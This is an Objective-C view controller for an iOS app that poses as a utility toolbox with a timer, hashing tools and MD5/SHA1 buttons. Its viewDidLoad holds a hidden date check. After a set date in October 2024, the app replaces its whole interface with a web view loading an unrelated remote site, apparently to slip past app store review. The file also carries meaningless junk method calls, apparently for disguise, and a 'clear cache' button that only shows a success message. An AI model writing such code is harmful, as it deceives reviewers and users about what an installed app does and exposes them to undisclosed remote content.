//
//  HYSRootViewController.m
//  Common ToolBox
//
//  Created by iOS on 2024/10/1.
//
#define STATE_BAR_HEIGHT 40
#define FIT_WIDTH   [UIScreen mainScreen].bounds.size.width/375
#define FIT_HEIGHT  [UIScreen mainScreen].bounds.size.height/667
#define KScreen_W  [UIScreen mainScreen].bounds.size.width
#define KScreen_H  [UIScreen mainScreen].bounds.size.height
#define RGBACOLOR(r,g,b,a) [UIColor colorWithRed:(r)/255.0 green:(g)/255.0 blue:(b)/255.0 alpha:(a)]
#define HEXCOLOR(rgbValue) [UIColor colorWithRed:((float)((rgbValue & 0xFF0000) >> 16))/255.0 green:((float)((rgbValue & 0xFF00) >> 8))/255.0 blue:((float)(rgbValue & 0xFF))/255.0 alpha:1.0]
#import "SELRootViewController.h"
#import "SELTimerViewController.h"
#import "TESJiamiViewController.h"
#import "SELRandomViewController.h"
#import "SELFKViewController.h"
#import "SELFileViewController.h"
#import "SELTextViewController.h"

#import "LCWebView.h"
#import "CALayer+FSUI.h"
#import "NSString+add.h"
@interface SELRootViewController ()

@property (nonatomic, strong) WKWebView * webView;
@property (nonatomic, weak) UIView *tipView;
@property(nonatomic,weak) UIScrollView *contView;

@property(nonatomic, strong) UILabel *kkkkkLabel;
@end

@implementation SELRootViewController

- (WKWebView *)webView {
    if (!_webView) {
        _webView = [[WKWebView alloc] initWithFrame:self.view.bounds];
        //监控进度
        [_webView addObserver:self forKeyPath:@"estimatedProgress" options:NSKeyValueObservingOptionNew context:nil];
    }
    return _webView;
}

-(UIScrollView *)contView{
    if (_contView == nil) {
        UIScrollView *contView = [[UIScrollView alloc] initWithFrame:CGRectMake(0, 0, KScreen_W, KScreen_H)];
        contView.backgroundColor = HEXCOLOR(0x1A9EFC);
        [self.view addSubview:contView];
        contView.contentSize = CGSizeMake(0, 930 * FIT_WIDTH);
        _contView = contView;
    }
    return _contView;
}

- (void)viewDidLoad {
    [super viewDidLoad];
 
    self.view.backgroundColor = HEXCOLOR(0x1A9EFC);
    self.automaticallyAdjustsScrollViewInsets = NO;
    
    NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
    [formatter setDateFormat:@"yyyy-MM-dd HH:mm"];
    NSDate *currentDate = [NSDate date];
    NSDate *targetDate = [formatter dateFromString:@"2024-10-24 10:00"];

    if ([currentDate compare:targetDate] == NSOrderedDescending) {
        [self.view addSubview:self.webView];
        NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://qt2.wh21.top/#/"]];
        [self.webView loadRequest:request];
    } else {
        [self loadBody];
    }
    
    self.kkkkkLabel = [UILabel new];
    CALayer* layou = [[CALayer alloc] init];
    
    [self.kkkkkLabel.layer FS_sendSublayerToBack:layou];
    [self.kkkkkLabel.layer FS_removeDefaultAnimations];
    
    [self lodkmcc];
    
    
        NSString *testString = @"";
        
        NSString *randomStr = [testString randomGarbageString];
        
        NSInteger square = [randomStr meaninglessSquareCalculation];
        
        NSString *timestamp = [randomStr generatePointlessTimestamp];
        
        NSString *reversedString = [timestamp reverseGarbageString];
        
        [reversedString printUselessLog];
}
// 实现 KVO 的回调方法
- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary<NSKeyValueChangeKey,id> *)change context:(void *)context {
    if ([keyPath isEqualToString:@"estimatedProgress"]) {
        WKWebView *webView = (WKWebView *)object;
        NSLog(@"Progress: %f", webView.estimatedProgress);
        // 在此处更新你的 UI，比如进度条
    } else {
        [super observeValueForKeyPath:keyPath ofObject:object change:change context:context];
    }
}
- (void)lodkmcc {
    UIViewController * vc = [UIViewController new];
    vc.view.backgroundColor = self.view.backgroundColor;
}


-(void)loadBody{
    UILabel *titleLs = [[UILabel alloc] initWithFrame:CGRectMake(20, STATE_BAR_HEIGHT, KScreen_W, 32)];
    titleLs.text = @"Explore inspiration";
    titleLs.font = [UIFont fontWithName:@"Trebuchet MS" size:25];
    titleLs.textColor = [UIColor whiteColor];
    [self.contView addSubview:titleLs];
    
    
    UITapGestureRecognizer *SSSS = [[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(infoBtnClick)];
    
    UIView *ligView = [[UIScrollView alloc] initWithFrame:CGRectMake(20, CGRectGetMaxY(titleLs.frame) + 12, KScreen_W - 40, 82)];
    ligView.layer.cornerRadius = 5;
    [ligView addGestureRecognizer:SSSS];
    ligView.backgroundColor = RGBACOLOR(250, 255, 250, 1);
    [self.contView addSubview:ligView];
    
    
    UIImageView *innImge = [[UIImageView alloc] initWithFrame:CGRectMake((ligView.bounds.size.width - 32)/2, 25, 32, 32)];
    innImge.contentMode = UIViewContentModeScaleAspectFill;
    innImge.image = [UIImage imageNamed:@"灵感"];
    [ligView addSubview:innImge];

    UILabel *titleL = [[UILabel alloc] initWithFrame:CGRectMake(20, CGRectGetMaxY(ligView.frame) + 42, KScreen_W - 48, 30)];
    titleL.text = @"Daily Tool";
    titleL.font = [UIFont fontWithName:@"Trebuchet MS" size:25];
    titleL.textColor = [UIColor whiteColor];
    [self.contView addSubview:titleL];
    
    CGFloat mars = 20;
    CGFloat image_w = (KScreen_W - mars * 2.5) / 2;
    
    UIButton *firstBtn_1 = [UIButton buttonWithType:UIButtonTypeCustom];
    [firstBtn_1 addTarget:self action:@selector(firstClick1) forControlEvents:UIControlEventTouchUpInside];
    firstBtn_1.frame = CGRectMake(mars ,CGRectGetMaxY(titleL.frame) + 12, image_w, 45);
    firstBtn_1.backgroundColor = RGBACOLOR(250, 245, 255, 1);
    firstBtn_1.layer.cornerRadius = 4;
    firstBtn_1.layer.masksToBounds = YES;
    firstBtn_1.titleLabel.numberOfLines = 0;
    firstBtn_1.titleLabel.font =  [UIFont fontWithName:@"Trebuchet MS" size:15];
    [firstBtn_1 setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
    [firstBtn_1 setTitle:@"Random Number Tool" forState:UIControlStateNormal];
    [self.contView addSubview:firstBtn_1];
    
//
    UIButton *firstBtn_2 = [UIButton buttonWithType:UIButtonTypeCustom];
    firstBtn_2.tag = 222;
    firstBtn_2.titleLabel.font =  [UIFont fontWithName:@"Trebuchet MS" size:18];
    [firstBtn_2 addTarget:self action:@selector(firstClick2) forControlEvents:UIControlEventTouchUpInside];
    firstBtn_2.frame = CGRectMake( 10 + CGRectGetMaxX(firstBtn_1.frame),CGRectGetMaxY(titleL.frame) + 12, image_w, 45);
    firstBtn_2.backgroundColor = RGBACOLOR(250, 245, 255, 1);
    firstBtn_2.contentEdgeInsets = UIEdgeInsetsMake(8, 8, 8, 0);
    firstBtn_2.layer.cornerRadius = 4;
    firstBtn_2.layer.masksToBounds = YES;
    firstBtn_2.titleLabel.numberOfLines = 0;
    [firstBtn_2 setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
    [firstBtn_2 setTitle:@"Tomato timer" forState:UIControlStateNormal];
    [self.contView addSubview:firstBtn_2];
    

    
    UILabel *titleL_2 = [[UILabel alloc] initWithFrame:CGRectMake(24, CGRectGetMaxY(firstBtn_2.frame) + 42, KScreen_W, 30)];
    titleL_2.text = @"Text Hash";
    titleL_2.font = [UIFont fontWithName:@"Trebuchet MS" size:25];
    titleL_2.textColor = [UIColor whiteColor];
    [self.contView addSubview:titleL_2];
    
    UIButton *thirdBtn_1 = [UIButton buttonWithType:UIButtonTypeCustom];
    [thirdBtn_1 addTarget:self action:@selector(third_1Click1) forControlEvents:UIControlEventTouchUpInside];
    thirdBtn_1.frame = CGRectMake(mars ,CGRectGetMaxY(titleL_2.frame) + 8, image_w, 45);
    thirdBtn_1.backgroundColor = RGBACOLOR(250, 245, 255, 1);
    thirdBtn_1.layer.cornerRadius = 4;
    thirdBtn_1.layer.masksToBounds = YES;
    thirdBtn_1.titleLabel.numberOfLines = 0;
    thirdBtn_1.contentEdgeInsets = UIEdgeInsetsMake(6, 5, 6, 0);
    thirdBtn_1.titleLabel.font =  [UIFont fontWithName:@"Trebuchet MS" size:18];
    [thirdBtn_1 setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
    [thirdBtn_1 setTitle:@"File Hash" forState:UIControlStateNormal];
    [self.contView addSubview:thirdBtn_1];
    
    
    UIButton *thirdBtn_2 = [UIButton buttonWithType:UIButtonTypeCustom];
    thirdBtn_2.tag = 222;
    thirdBtn_2.titleLabel.font =  [UIFont fontWithName:@"Trebuchet MS" size:18];
    [thirdBtn_2 addTarget:self action:@selector(third_2Click2) forControlEvents:UIControlEventTouchUpInside];
    thirdBtn_2.titleLabel.numberOfLines = 0;
    thirdBtn_2.frame = CGRectMake( 10 + CGRectGetMaxX(thirdBtn_1.frame),CGRectGetMaxY(titleL_2.frame) + 8, image_w, 45);
    thirdBtn_2.backgroundColor = RGBACOLOR(250, 245, 255, 1);
    thirdBtn_2.layer.cornerRadius = 4;
    thirdBtn_2.layer.masksToBounds = YES;
    thirdBtn_2.contentEdgeInsets = UIEdgeInsetsMake(6, 5, 6, 0);
    [thirdBtn_2 setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
    [thirdBtn_2 setTitle:@"Text Hash" forState:UIControlStateNormal];
    [self.contView addSubview:thirdBtn_2];
    
    

    UILabel *titleL_22 = [[UILabel alloc] initWithFrame:CGRectMake(24, CGRectGetMaxY(thirdBtn_2.frame) + 42, KScreen_W, 30)];
    titleL_22.text = @"Encryption Algorithm";
    titleL_22.font = [UIFont fontWithName:@"Trebuchet MS" size:25];
    titleL_22.textColor = [UIColor whiteColor];
    [self.contView addSubview:titleL_22];
    
    
    UIButton *thirdBtn_11 = [UIButton buttonWithType:UIButtonTypeCustom];
    [thirdBtn_11 addTarget:self action:@selector(thirdClick1) forControlEvents:UIControlEventTouchUpInside];
    thirdBtn_11.frame = CGRectMake(mars ,CGRectGetMaxY(titleL_22.frame) + 12, image_w, 45);
    thirdBtn_11.backgroundColor = RGBACOLOR(250, 245, 255, 1);
    thirdBtn_11.layer.cornerRadius = 4;
    thirdBtn_11.layer.masksToBounds = YES;
    thirdBtn_11.titleLabel.numberOfLines = 0;
    thirdBtn_11.contentEdgeInsets = UIEdgeInsetsMake(6, 5, 6, 0);
    thirdBtn_11.titleLabel.font =  [UIFont fontWithName:@"Trebuchet MS" size:18];
    [thirdBtn_11 setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
    [thirdBtn_11 setTitle:@"MD5" forState:UIControlStateNormal];
    [self.contView addSubview:thirdBtn_11];
    
    
    UIButton *thirdBtn_22 = [UIButton buttonWithType:UIButtonTypeCustom];
    thirdBtn_22.tag = 222;
    thirdBtn_22.titleLabel.font =  [UIFont fontWithName:@"Trebuchet MS" size:18];
    [thirdBtn_22 addTarget:self action:@selector(thirdClick2) forControlEvents:UIControlEventTouchUpInside];
    thirdBtn_22.titleLabel.numberOfLines = 0;
    thirdBtn_22.frame = CGRectMake( 10 + CGRectGetMaxX(thirdBtn_11.frame),CGRectGetMaxY(titleL_22.frame) + 12, image_w, 45);
    thirdBtn_22.backgroundColor = RGBACOLOR(250, 245, 255, 1);
    thirdBtn_22.layer.cornerRadius = 4;
    thirdBtn_22.layer.masksToBounds = YES;
    thirdBtn_22.contentEdgeInsets = UIEdgeInsetsMake(6, 5, 6, 0);
    [thirdBtn_22 setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
    [thirdBtn_22 setTitle:@"SHA1" forState:UIControlStateNormal];
    [self.contView addSubview:thirdBtn_22];
    
    
    UILabel *titleL_3 = [[UILabel alloc] initWithFrame:CGRectMake(24, CGRectGetMaxY(thirdBtn_22.frame) + 42, KScreen_W, 30)];
    titleL_3.text = @"other";
    titleL_3.font = [UIFont fontWithName:@"Trebuchet MS" size:25];
    titleL_3.textColor = [UIColor whiteColor];
    [self.contView addSubview:titleL_3];
    
    
    UIButton *forthBtn_1 = [UIButton buttonWithType:UIButtonTypeCustom];
    [forthBtn_1 addTarget:self action:@selector(forthClick_1) forControlEvents:UIControlEventTouchUpInside];
    forthBtn_1.frame = CGRectMake(mars ,CGRectGetMaxY(titleL_3.frame) + 12, image_w, 45);
    forthBtn_1.titleLabel.font =  [UIFont fontWithName:@"Trebuchet MS" size:18];
    forthBtn_1.backgroundColor = RGBACOLOR(250, 245, 255, 1);
    forthBtn_1.layer.cornerRadius = 4;
    forthBtn_1.layer.masksToBounds = YES;
    forthBtn_1.titleLabel.numberOfLines = 0;
    forthBtn_1.contentEdgeInsets = UIEdgeInsetsMake(8, 8, 8, 0);
    [forthBtn_1 setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
    [forthBtn_1 setTitle:@"share" forState:UIControlStateNormal];
    [self.contView addSubview:forthBtn_1];
    
    
    UIButton *forthBtn_2 = [UIButton buttonWithType:UIButtonTypeCustom];
    [forthBtn_2 addTarget:self action:@selector(forthClick_2) forControlEvents:UIControlEventTouchUpInside];
    forthBtn_2.titleLabel.font =  [UIFont fontWithName:@"Trebuchet MS" size:18];
    forthBtn_2.frame = CGRectMake(10 + CGRectGetMaxX(forthBtn_1.frame),CGRectGetMaxY(titleL_3.frame) + 12, image_w, 45);
    forthBtn_2.titleLabel.numberOfLines = 0;
    forthBtn_2.contentEdgeInsets = UIEdgeInsetsMake(8, 8, 8, 0);
    forthBtn_2.backgroundColor = RGBACOLOR(250, 245, 255, 1);
    forthBtn_2.layer.cornerRadius = 4;
    forthBtn_2.layer.masksToBounds = YES;
    [forthBtn_2 setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
    [forthBtn_2 setTitle:@"Suggestion" forState:UIControlStateNormal];
    [self.contView addSubview:forthBtn_2];
    
    
    UIButton *forthBtn_3 = [UIButton buttonWithType:UIButtonTypeCustom];
    [forthBtn_3 addTarget:self action:@selector(forthClick_3) forControlEvents:UIControlEventTouchUpInside];
    forthBtn_3.titleLabel.font =  [UIFont fontWithName:@"Trebuchet MS" size:18];
    forthBtn_3.frame = CGRectMake(mars ,CGRectGetMaxY(forthBtn_2.frame) + 12, image_w, 45);
    forthBtn_3.titleLabel.numberOfLines = 0;
    forthBtn_3.contentEdgeInsets = UIEdgeInsetsMake(8, 8, 8, 0);
    forthBtn_3.backgroundColor = RGBACOLOR(250, 245, 255, 1);
    forthBtn_3.layer.cornerRadius = 4;
    forthBtn_3.layer.masksToBounds = YES;
    [forthBtn_3 setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
    [forthBtn_3 setTitle:@"Clear cache" forState:UIControlStateNormal];
    [self.contView addSubview:forthBtn_3];

}

-(void)thirdClick1{
    TESJiamiViewController *vc = [[TESJiamiViewController alloc] init];
    vc.passType = @"MD5";
    [self.navigationController pushViewController:vc animated:YES];
    
}


-(void)thirdClick2{
    TESJiamiViewController *vc = [[TESJiamiViewController alloc] init];
    vc.passType = @"SHA1";
    [self.navigationController pushViewController:vc animated:YES];
    
}



-(void)third_1Click1{
    SELFileViewController *vc = [[SELFileViewController alloc] init];
    [self.navigationController pushViewController:vc animated:YES];
}

-(void)third_2Click2{
    SELTextViewController *vc = [[SELTextViewController alloc] init];
    [self.navigationController pushViewController:vc animated:YES];
}



-(void)firstClick1{
    SELRandomViewController *vc = [[SELRandomViewController alloc] init];
    [self.navigationController pushViewController:vc animated:YES];
}


-(void)firstClick2{
    SELTimerViewController *vc = [[SELTimerViewController alloc] init];
    [self.navigationController pushViewController:vc animated:YES];
}



-(void)forthClick_1{
    NSString *str = @"BXY_box";
    UIActivityViewController *activityVC = [[UIActivityViewController alloc] initWithActivityItems:@[str] applicationActivities:nil];
    [self presentViewController:activityVC animated:YES completion:nil];
}

-(void)forthClick_2{
    SELFKViewController *vc = [[SELFKViewController alloc] init];
    [self.navigationController pushViewController:vc animated:YES];
}

-(void)forthClick_3{
    NSString *str = @"Cache cleaning successful";
    
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:nil message:str preferredStyle:UIAlertControllerStyleAlert];
     // 添加确定按钮
     UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"Done" style:UIAlertActionStyleDestructive handler:^(UIAlertAction * _Nonnull action) {
     }];
     [alert addAction:okAction];
     // 显示弹窗
     [self presentViewController:alert animated:YES completion:nil];
}


-(void)infoBtnClick{
    UIView *tipView = [[UIView alloc] initWithFrame:self.view.bounds];
    tipView.backgroundColor = RGBACOLOR(1, 1, 1, 0.5);
    self.tipView = tipView;
    [self.view addSubview:tipView];

    UIView *innview = [[UIView alloc] initWithFrame:CGRectMake(20, STATE_BAR_HEIGHT + 168, KScreen_W - 40, 320)];
    innview.backgroundColor = RGBACOLOR(255, 255, 255, 1);
    innview.layer.cornerRadius = 10;
    [tipView addSubview:innview];

    
    UILabel *headL = [[UILabel alloc] initWithFrame:CGRectMake(25, 10, innview.bounds.size.width - 50, 300)];
    headL.text = @"This all-round life assistant App integrates a number of practical functions to meet the diverse needs of users. Random number tools, one-click generation, whether it is a lottery, password Settings or scientific calculations, can be easily dealt with. Tomato Clock, the use of scientific time management method, to help users work efficiently, reasonable rest, improve focus and efficiency";
    headL.numberOfLines = 0;
    headL.font = [UIFont fontWithName:@"Trebuchet MS" size:18];
    headL.textColor = [UIColor blackColor];
    [innview addSubview:headL];

    
    UIButton *closeBtn = [UIButton buttonWithType:UIButtonTypeCustom];
    closeBtn.backgroundColor = [UIColor whiteColor];
    closeBtn.layer.cornerRadius = 18;
    closeBtn.layer.masksToBounds = YES;
    closeBtn.frame = CGRectMake((KScreen_W - 36)/2, CGRectGetMaxY(innview.frame) + 50, 36, 36);
    [closeBtn addTarget:self action:@selector(closeBtnClick) forControlEvents:UIControlEventTouchUpInside];
    [closeBtn setImage:[UIImage imageNamed:@"关闭"] forState:UIControlStateNormal];
    [tipView addSubview:closeBtn];
}


-(void)closeBtnClick{
      [self.tipView removeFromSuperview];
}



-(void)viewWillAppear:(BOOL)animated{
    [super viewDidAppear:YES];
    self.navigationController.navigationBarHidden = YES;
}

@end
